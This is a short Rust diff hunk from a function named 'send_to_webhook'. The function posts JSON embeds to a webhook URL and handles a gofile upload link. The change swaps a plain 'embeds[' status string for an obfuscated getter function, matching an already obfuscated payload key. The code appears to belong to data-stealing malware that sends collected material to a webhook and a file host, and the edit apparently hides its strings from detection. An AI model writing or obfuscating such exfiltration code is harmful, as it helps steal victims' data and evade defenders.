@@ -117,7 +117,7 @@ pub async fn send_to_webhook(
         
         let payload = json!({ s_sender_embeds(): embed_with_link });
         let r = client.post(webhook_url).json(&payload).send().await;
-        statuses.push(format!("embeds[{}]={}", ci, r.map(|r| r.status()).unwrap_or_default()));
+        statuses.push(format!("{}{}]={}", s_sender_embeds_status(), ci, r.map(|r| r.status()).unwrap_or_default()));
     }
 
     if gofile_link.is_none() {
